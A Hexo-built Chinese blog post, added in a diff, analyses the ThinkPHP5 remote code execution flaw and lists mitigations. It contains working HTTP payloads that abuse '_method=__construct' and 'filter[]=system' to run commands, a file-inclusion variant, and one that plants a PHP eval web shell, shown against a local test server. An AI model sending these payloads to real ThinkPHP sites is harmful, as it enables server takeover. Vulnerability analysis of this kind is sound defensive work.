@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta property="og:description" content="">
+    <meta property="og:type" content="website">
+    <meta name="description" content="">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        ThinkPHP5 远程代码执行漏洞分析 - undefined
+        
+    </title>
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/aircloud.css">
+
+    
+<link rel="stylesheet" href="/css/gitment.css">
+
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_28hi1hpxx24.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i>  </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/img/avatar.jpeg" />
+        </div>
+        <div class="name">
+            <i>seaii</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li >
+                <a href="/collect/">
+                    <i class="iconfont icon-shoucang1"></i>
+                    <span>COLLECT</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-text">漏洞点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91"><span class="toc-text">漏洞触发</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#5-0-0-5-0-12"><span class="toc-text">5.0.0-5.0.12</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-0-13-5-0-23"><span class="toc-text">5.0.13-5.0.23</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BC%80%E5%90%AF%E4%BA%86debug%E6%A8%A1%E5%BC%8F"><span class="toc-text">开启了debug模式</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%89%E7%9B%B4%E6%8E%A5%E8%B7%AF%E7%94%B1%E5%88%B0%E6%8E%A7%E5%88%B6%E5%99%A8%E7%B1%BB%E6%88%96%E8%80%85%E6%96%B9%E6%B3%95%E7%9A%84%E8%B7%AF%E7%94%B1%E8%A7%84%E5%88%99"><span class="toc-text">有直接路由到控制器类或者方法的路由规则</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1"><span class="toc-text">漏洞防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8A%B1%E5%BC%8Fpayload"><span class="toc-text">花式payload</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-bg" id="search-bg"></div>
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i>  </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        ThinkPHP5 远程代码执行漏洞分析
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2019-01-14 23:58:00</span></span>
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#thinkphp" title="thinkphp">thinkphp</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>消息刚刚曝出来的时候还以为自己能半天把漏洞给找出来，果然是太菜太年轻了，23333</p>
+<span id="more"></span>
+
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>此次漏洞出现在ThinkPHP用于处理HTTP请求的Request类中，其中的method方法用于获取当前的请求类型。</p>
+<p><code>thinkphp/library/think/Request.php</code></p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190114115839.png"></p>
+<p><code>var_method</code>为“表单伪装变量”，可在<code>application/config.php</code>中定义：</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190114121130.png"></p>
+<p>该变量用于请求类型的伪装，官方文档如下：</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190114121235.png"></p>
+<p>由于没有做任何过滤，我们可以通过控制<code>_method</code>参数的值来动态调用Request类中的任意方法，通过控制<code>$_POST</code>的值来向调用的方法传递参数。</p>
+<p>来看一下Request类的构造方法：</p>
+<p><code>thinkphp/library/think/Request.php</code></p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190114122019.png"></p>
+<p>该方法将传入的数组进行遍历，如果数组的键名与类的属性名相同，就将对应的值赋给类属性。因此我们可以通过控制post参数来控制Request类的各种属性。</p>
+<h3 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h3><p>漏洞点已经找到，那么如何来触发它呢？</p>
+<h4 id="5-0-0-5-0-12"><a href="#5-0-0-5-0-12" class="headerlink" title="5.0.0-5.0.12"></a>5.0.0-5.0.12</h4><p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /tp5010/public/index.php?s=index/index/index HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8000</span><br><span class="line">Content-Length: 52</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">s=whoami&amp;_method=__construct&amp;filter[]=system</span><br></pre></td></tr></table></figure>
+
+<p>ThinkPHP在解析路由的过程中会调用Request类的method方法：</p>
+<p><code>thinkphp/library/think/Route.php</code></p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190114123759.png"></p>
+<p>具体调用流程如下：</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190114124004.png"></p>
+<p>此时我们已将类属性成功赋值为我们可控的值，接下来ThinkPHP会处理请求的参数，调用流程如下：</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190114125051.png"></p>
+<p>由于我们之前覆盖了Request类的filer属性，该属性用来指定全局过滤函数，所以所有的http参数都会经过过滤函数。</p>
+<p><code>thinkphp/library/think/Request.php</code></p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190114125724.png"></p>
+<p>跟进filterValue函数：</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190114133846.png"></p>
+<p>可以看到在filterValue方法中调用了call_user_func成功执行了system函数。</p>
+<h4 id="5-0-13-5-0-23"><a href="#5-0-13-5-0-23" class="headerlink" title="5.0.13-5.0.23"></a>5.0.13-5.0.23</h4><p>在ThinkPHP 5.0.12之后的版本中，在<code>thinkphp/library/think/App.php</code>的module方法中增加了设置filter属性的代码：</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190114140517.png"></p>
+<p>这样一来我们之前设置的filter属性就会被重新覆盖为空，导致之前的payload失效，必须寻找新的触发点。</p>
+<p>我们回看上面的调用过程，发现Request类中的param方法也调用了method方法：</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190114143100.png"></p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190114143638.png"></p>
+<p>当method参数为true时，会进入server方法，跟进看一下：</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190115000601.png"></p>
+<p>继续跟进input方法：</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190114145809.png"></p>
+<p>可以看出Request类的server属性是一个数组，并且是可控的，这里input方法将key为REQUEST_METHOD的成员取出来放入了filterValue方法。这里我们需要找到调用Request类的param方法的地方来触发漏洞。</p>
+<h5 id="开启了debug模式"><a href="#开启了debug模式" class="headerlink" title="开启了debug模式"></a>开启了debug模式</h5><p>如果debug模式开启，在<code>thinkphp/library/think/App.php</code>的run方法中会记录路由和请求信息，此处调用了param方法。</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190114150508.png"></p>
+<p>由于此时还没有执行到module方法，所以filter属性仍是我们设置的值，没有被重新赋值。</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /tp5023/public/index.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8000</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 70</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=id</span><br></pre></td></tr></table></figure>
+
+<h5 id="有直接路由到控制器类或者方法的路由规则"><a href="#有直接路由到控制器类或者方法的路由规则" class="headerlink" title="有直接路由到控制器类或者方法的路由规则"></a>有直接路由到控制器类或者方法的路由规则</h5><p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /tp5023/public/index.php/?s=captcha HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8000</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 72</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id</span><br></pre></td></tr></table></figure>
+
+<p>根据前面的分析，我们知道之前的payload失效的原因是在<code>thinkphp/library/think/App.php</code>的module方法中增加了设置filter属性的代码，那么我们可不可以不执行module方法而执行其他方法呢？</p>
+<p><code>thinkphp/library/think/App.php</code></p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190114172252.png"></p>
+<p>可以看到exec方法通过<code>$dispatch[&#39;type&#39;]</code>来决定调用哪个方法，在调用controller和method方法时都调用了Request类的param方法。现在来看一下<code>$dispatch</code>是从哪来的：</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190114172815.png"></p>
+<p>跟进routeCheck方法：</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190114173601.png"></p>
+<p>从配置文件中读取了路由配置后导入，然后进入了Route类的check方法。</p>
+<p><code>thinkphp/library/think/Route.php</code></p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190114175739.png"></p>
+<p>这里调用了我们熟悉的method方法，这里就是我们进行变量覆盖的地方，再来看一下method方法：</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190114175001.png"></p>
+<p>在我们覆盖了类属性之后，直接将method属性返回了。获取到method之后，会根据method的值到<code>self::$rule</code>中获取相应的路由规则。</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190114175526.png"></p>
+<p>由于ThinkPHP有自动加载机制，在运行时会自动加载<code>vendor</code>目录下的第三方库。加载过程如下：</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190114180124.png"></p>
+<p>其中ThinkPHP<strong>完整版</strong>中有一个验证码的第三方库，在被加载的时候会注册一条路由规则，当我们访问<code>http://xxx/captcha</code>时会路由到<code>\think\captcha\CaptchaController</code>的index方法。</p>
+<p><code>vendor/topthink/think-captcha/src/helper.php</code></p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190114180046.png"></p>
+<p>回到<code>thinkphp/library/think/Route.php</code></p>
+<p>ThinkPHP会解析这条路由规则，解析过程如下：</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190114182111.png"></p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190114182341.png"></p>
+<p>由于这条规则是直接路由到控制器类的方法，所以type为method。</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190114182835.png"></p>
+<p>再回到<code>thinkphp/library/think/App.php</code>的exec方法，可以看到已经能够执行param方法，达到了rce的目的。</p>
+<h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><ol>
+<li><p>线上环境建议关闭debug模式</p>
+</li>
+<li><p>升级到ThinkPHP 5.0.24</p>
+</li>
+<li><p>手动增加过滤，在<code>thinkphp/library/think/Request.php</code>添加如下代码：</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190114184400.png"></p>
+</li>
+</ol>
+<h2 id="花式payload"><a href="#花式payload" class="headerlink" title="花式payload"></a>花式payload</h2><p>漏洞出来之后师傅各显神通，骚payload一个接一个。精力有限，没法挨个分析，在这里收集一下。</p>
+<ul>
+<li><p>5.1版本，需设置<code>error_reporting(0);</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /tp5132/public/index.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8000</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: XDEBUG_SESSION=PHPSTORM</span><br><span class="line">Content-Length: 28</span><br><span class="line"></span><br><span class="line">c=system&amp;f=id&amp;_method=filter</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>利用文件包含</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;server[]=phpinfo&amp;get[]=../data/runtime/log/201901/21.log&amp;x=phpinfo();</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>利用其他变量传参</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;server[]=phpinfo&amp;get[]=&lt;?php eval($_POST[&#x27;x&#x27;])?&gt;</span><br></pre></td></tr></table></figure></li>
+</ul>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+        <div id="lv-container"></div>
+        <div class="giscus"></div>
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>  Theme <a target="_blank" rel="noopener" href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = ""
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+<script src="/js/index.js"></script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+</html>
